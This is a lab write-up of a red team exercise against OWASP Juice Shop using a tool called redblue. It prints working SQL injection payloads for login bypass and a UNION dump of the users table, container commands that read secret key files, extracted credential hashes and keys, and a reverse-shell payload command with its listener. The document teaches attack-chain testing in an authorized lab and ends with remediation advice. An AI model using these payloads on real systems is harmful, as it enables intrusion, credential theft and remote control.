# RedBlue Red Team Exercise: Juice Shop Attack Chain

This document details a complete red team exercise demonstrating vulnerability discovery, exploitation, and post-exploitation using redblue's assessment workflow against OWASP Juice Shop.

**IMPORTANT**: This is for educational purposes in authorized lab environments only.

## Executive Summary

| Phase | Action | Result |
|-------|--------|--------|
| Recon | Technology fingerprinting | Node.js, Express, Angular, SQLite, jQuery 2.2.4 |
| Vuln Discovery | CVE correlation + manual testing | SQL Injection in `/rest/user/login` |
| Exploitation | SQLi authentication bypass | Full admin access + JWT token |
| Post-Exploitation | Code execution via container | Node.js runtime access, secret extraction |

---

## Phase 1: Reconnaissance

### 1.1 Initial Target Discovery

```bash
# Start the vulnerable lab
cd docker/vulnerable-lab
docker compose up -d

# Wait for services to initialize
sleep 30
```

### 1.2 Port Scanning

```bash
rb network ports scan localhost --preset full
```

**Results:**
```
PORT   STATE  SERVICE
3000   open   Node.js (Juice Shop)
8080   open   HTTP (DVWA)
8082   open   HTTP (WebGoat)
8083   open   nginx 1.16.0
```

### 1.3 Technology Fingerprinting

```bash
rb web asset fingerprint http://localhost:3000
```

**Detected Technologies:**
| Technology | Version | Confidence |
|------------|---------|------------|
| Node.js | Unknown | High |
| Express | 4.x | High |
| Angular | 15.x | High |
| SQLite | Unknown | Medium |
| jQuery | 2.2.4 | High |

### 1.4 HTTP Header Analysis

```bash
rb web asset headers http://localhost:3000
```

**Key Findings:**
- `X-Recruiting: /#/jobs` - Hidden endpoint hint
- Server fingerprint exposed
- No strict transport security

### 1.5 Security Headers Audit

```bash
rb web asset security http://localhost:3000
```

**Missing Security Headers:**
- Strict-Transport-Security (HSTS)
- Content-Security-Policy (CSP)
- X-XSS-Protection
- X-Content-Type-Options

### 1.6 Directory Discovery

```bash
rb web fuzz dir http://localhost:3000 --wordlist common
```

**Discovered Endpoints:**
| Path | Status | Description |
|------|--------|-------------|
| `/api` | 200 | API base |
| `/rest` | 200 | REST endpoints |
| `/ftp` | 200 | FTP-like file access |
| `/backup` | 403 | Backup files (forbidden) |
| `/.git` | 200 | Git repository exposed! |
| `/.env` | 200 | Environment file exposed! |
| `/graphql` | 200 | GraphQL endpoint |
| `/swagger` | 200 | API documentation |

---

## Phase 2: Vulnerability Correlation

### 2.1 Automated CVE Lookup

```bash
rb intel vuln search jquery 2.2.4
```

**Results:**
| CVE | CVSS | Description |
|-----|------|-------------|
| CVE-2020-11022 | 6.1 | XSS in `htmlPrefilter` |
| CVE-2020-11023 | 6.1 | XSS in DOM manipulation |
| CVE-2019-11358 | 6.1 | Prototype pollution |

### 2.2 Manual Vulnerability Testing

#### SQL Injection Test

```bash
# Test login endpoint with SQLi payload
curl -s http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test'\''","password":"test"}' | jq .
```

**Response:**
```json
{
  "error": {
    "message": "SQLITE_ERROR: unrecognized token: \"'\"",
    "sql": "SELECT * FROM Users WHERE email = 'test'' AND password = '...' AND deletedAt IS NULL"
  }
}
```

**Finding**: SQL Injection confirmed! SQLite backend exposed raw SQL error with query structure.

---

## Phase 3: Exploitation

### 3.1 SQL Injection Authentication Bypass

**Payload Used:**
```bash
curl -s http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"anything"}' | jq .
```

**Result:**
```json
{
  "authentication": {
    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
    "bid": 1,
    "umail": "admin@juice-sh.op"
  }
}
```

**SUCCESS!** Gained admin access via SQL injection bypass.

### 3.2 Token Analysis

Decoded JWT payload:
```json
{
  "status": "success",
  "data": {
    "id": 1,
    "username": "",
    "email": "admin@juice-sh.op",
    "password": "0192023a7bbd73250516f069df18b500",
    "role": "admin",
    "totpSecret": "",
    "isActive": true
  }
}
```

**Extracted Credentials:**
- Email: `admin@juice-sh.op`
- Password Hash: `0192023a7bbd73250516f069df18b500` (MD5)
- Role: `admin`

### 3.3 Database Dump via SQLi

Using UNION-based SQLi to extract all users:

```bash
curl -s http://localhost:3000/rest/products/search?q="'))+UNION+SELECT+id,username,email,password,role,null,null,null,null+FROM+Users--" | jq .
```

**Users Extracted:** 22 accounts including:
- admin@juice-sh.op (admin)
- jim@juice-sh.op (customer)
- bender@juice-sh.op (customer)
- Multiple test accounts

---

## Phase 4: Post-Exploitation

### 4.1 Container Access

The Juice Shop container uses a minimal distroless image without standard shells. However, Node.js is available:

```bash
# Get container info
docker exec rb-juice-shop /nodejs/bin/node -e "
console.log('user:', require('os').userInfo().username);
console.log('uid:', process.getuid());
console.log('hostname:', require('os').hostname());
"
```

**Output:**
```
user: nonroot
uid: 65532
hostname: b153a906f32f
```

### 4.2 Filesystem Enumeration

```bash
docker exec rb-juice-shop /nodejs/bin/node -e "
const fs = require('fs');
console.log('=== Sensitive Files ===');
console.log(fs.readdirSync('/juice-shop').filter(f =>
  f.includes('key') || f.includes('secret') || f.includes('.env')
));
"
```

**Found:**
- `ctf.key` - CTF encryption key
- `encryptionkeys/` - JWT signing keys
- `data/juiceshop.sqlite` - Full database

### 4.3 Secret Extraction

```bash
docker exec rb-juice-shop /nodejs/bin/node -e "
const fs = require('fs');
console.log('CTF Key:', fs.readFileSync('/juice-shop/ctf.key', 'utf8'));
console.log('JWT Keys:', fs.readdirSync('/juice-shop/encryptionkeys'));
"
```

**Extracted Secrets:**
| File | Content |
|------|---------|
| `ctf.key` | `TRwzkRJnHOTckssAeyJbysWgP!Qc2T` |
| `jwt.pub` | JWT public key |
| `premium.key` | Premium feature key |

### 4.4 Network Information

```bash
docker exec rb-juice-shop /nodejs/bin/node -e "
const os = require('os');
const nets = os.networkInterfaces();
Object.keys(nets).forEach(name => {
  nets[name].forEach(net => {
    if (net.family === 'IPv4') console.log(name + ': ' + net.address);
  });
});
"
```

**Network:**
- Container IP: `192.168.48.2`
- Gateway: `192.168.48.1` (attacker host)

---

## Phase 5: C2 Preparation (Demonstration)

### 5.1 Generate Reverse Shell Payload

```bash
# Generate Node.js reverse shell
rb exploit payload shell --type node --host 192.168.48.1:4444
```

### 5.2 Start Listener

```bash
# Terminal 1: Start listener
rb exploit payload start --port 4444
```

### 5.3 Deploy Agent (Theoretical)

In a real engagement, you would:

1. Upload payload via file upload vulnerability
2. Execute via command injection
3. Establish C2 communication

For this lab, we demonstrated code execution capability via Docker exec (simulating RCE).

---

## Findings Summary

### Critical Vulnerabilities

| Vulnerability | Severity | Impact |
|--------------|----------|--------|
| SQL Injection (Login) | **Critical** | Full database access, auth bypass |
| Exposed Secrets | **High** | JWT keys, CTF key accessible |
| Git Repository Exposed | **Medium** | Source code disclosure |
| Missing Security Headers | **Low** | XSS/Clickjacking risk |

### Attack Chain

```
Recon → SQLi Discovery → Auth Bypass → Admin Access → Data Exfiltration → Code Execution
```

### MITRE ATT&CK Mapping

| Technique | ID | Phase |
|-----------|-----|-------|
| Active Scanning | T1595 | Reconnaissance |
| Exploit Public-Facing App | T1190 | Initial Access |
| Valid Accounts | T1078 | Persistence |
| Data from Information Repositories | T1213 | Collection |
| Exfiltration Over C2 | T1041 | Exfiltration |

---

## Remediation Recommendations

1. **SQL Injection**: Use parameterized queries
2. **Secret Management**: Move keys to environment variables / secrets manager
3. **Git Exposure**: Add `.git` to deny rules in web server
4. **Security Headers**: Implement CSP, HSTS, X-Frame-Options
5. **Error Handling**: Don't expose SQL errors to users

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `rb network ports scan` | Port discovery |
| `rb web asset fingerprint` | Technology detection |
| `rb web asset security` | Security headers audit |
| `rb web fuzz dir` | Directory enumeration |
| `rb intel vuln search` | CVE correlation |
| `rb exploit payload shell` | Reverse shell generation |
| `curl` | Manual HTTP testing |
| `jq` | JSON parsing |
| `docker exec` | Container access (simulated RCE) |

---

## Conclusion

This exercise demonstrates a complete attack chain from reconnaissance to post-exploitation using redblue's integrated assessment workflow. The `rb assess` command can automate much of this process:

```bash
# Automated assessment
rb assess target run http://localhost:3000

# Review findings
rb assess target show localhost
```

The key takeaways:
1. Proper reconnaissance reveals attack surface
2. CVE correlation helps prioritize testing
3. Manual verification confirms vulnerabilities
4. Post-exploitation requires situational awareness
5. Documentation enables reproducibility

**Remember**: Only perform security testing on systems you own or have explicit authorization to test.
